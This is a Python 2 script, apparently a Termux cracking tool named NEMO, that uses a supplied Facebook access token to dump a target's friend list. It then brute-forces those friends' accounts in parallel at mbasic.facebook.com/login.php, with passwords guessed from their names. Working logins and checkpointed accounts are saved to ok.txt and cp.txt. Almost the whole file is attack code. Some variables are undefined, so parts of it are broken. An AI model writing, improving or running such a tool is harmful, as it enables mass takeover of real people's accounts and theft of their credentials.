#!/usr/bin/python2
#-*-coding:utf-8-*-

try:
    import requests,bs4,sys,os,subprocess,datetime,shutil,sys,random,time,re,base64,json,glob,nn
    from concurrent.futures import ThreadPoolExecutor as NeMo
    from bs4 import BeautifulSoup as parser
except ImportError:
    exit

reload(sys)
sys.setdefaultencoding("utf-8")

cp = []
ok = []
id = []
user = []
loop = 0

logo = """\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m
            \033[1;92m •••••\033[1;97m\033[0m NEMO
\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m"""

def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.03)

def log_token():
	os.system('clear')
	print logo
	data = raw_input("\nToken: ")
	try:
		me = requests.get('https://graph.facebook.com/me?access_token='+data)
		open("token.txt",'w').write(data)
		publik()
	except KeyError:
		log_token()

def publik():
	try:
		toket=open('token.txt','r').read()
	except IOError:
		os.system('rm -rf token.txt')
		time.sleep(0.01)
		log_token()
	try:
		idt = raw_input("DUMP UID: ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
		except KeyError:
			print('UID Tidak Ada')
			time.sleep(0.2)
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(10000)&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = ('public.json').replace(" ","_")
		ys = open(qq , 'w')#.replace(" ","_")
		for a in z['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
		print("\rTarget %s UID"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
		ys.close()
		raw_input("\nENTER to CRACK")
		__crack__().__brute__()
	except Exception as e:
		print('0 Teman');time.sleep(3)
		menu()
	except KeyError:
		print('0 Teman')
		raw_input('ENTER')
		publik()

class __crack__:

    def __init__(self):
        self.id = []

    def __api__(self, user, __emo__):
        global ok,cp,loop
        sys.stdout.write('\r[WAIT] %s/%s -> %s %s'%(loop,len(self.id),len(cp),len(ok))),
        sys.stdout.flush()
        for pw in __emo__:
            pw = pw.lower()
            ngUA = 'Mozilla/5.0 (Series40; NokiaC2-02/07.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45'
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                open('ok.txt','a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                wrt = '%s|%s' % (user,pw)
                cp.append(wrt)
                open('cp.txt', 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __brute__(self):
        self.id = open('public.json', 'r').read().splitlines()
        jalan;time.sleep(0.2)
        with NeMo(max_workers=30) as (__nemoXD__):
            for omen in self.id:
                try:
                    uid, name = omen.split('<=>')
                    xz = name.split(' ')
                    if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                        pwx = [name]
                    else:
                        pwx = [name, x+"123"]
                    __nemoXD__.submit(self.__api__, uid, pwx)
                except:
                    pass

        os.system("rm -rf public.json")
        rename()

def rename():
    try:
        os.makedirs('/data/data/com.termux/files/home/hasil')
        time.sleep(1)
    except OSError:
        pass
    try:
        open("/data/data/com.termux/files/home/cp.txt","r")
        os.system("mv /data/data/com.termux/files/home/cp.txt /data/data/com.termux/files/home/cpcok.txt")
        onem = datetime.datetime.now().strftime("%d%m%y_%H%M%S")
        oldname = r"/data/data/com.termux/files/home/cpcok.txt"
        newname = r"/data/data/com.termux/files/home/hasil/cpcp" + onem + ".txt"
        shutil.move(oldname, newname)
        print("\nDONE")
    except (KeyError, IOError):
        print("\nZONK")
    try:
        open("/data/data/com.termux/files/home/ok.txt","r")
        os.system("mv /data/data/com.termux/files/home/ok.txt /data/data/com.termux/files/home/okcok.txt")
        onem = datetime.datetime.now().strftime("%d%m%y_%H%M%S")
        oldname = r"/data/data/com.termux/files/home/okcok.txt"
        newname = r"/data/data/com.termux/files/home/hasil/okok" + onem + ".txt"
        shutil.move(oldname, newname)
        print("\nDONE")
    except (KeyError, IOError):
        pass
    raw_input('\nENTER to EXIT')
    sys.exit()

def menu():
    os.system("clear")
    print logo
    print ('\n[1] Lanjut Crack')
    print ('[2] Ganti Token\n')
    mn = raw_input("[•] Pilih: ")
    if mn == "":
        print ('goblok!')
        menu()
    elif mn == "1" or mn == '01':
        publik()
    elif mn == "2" or mn == '02':
        os.system("rm -rf token.txt")
        print ('[•] Token Dihapus')
        time.sleep(1)
        log_token()
    else:
        print ('goblok!')
        menu()

if __name__=='__main__':
    os.system('clear');print logo
    publik()
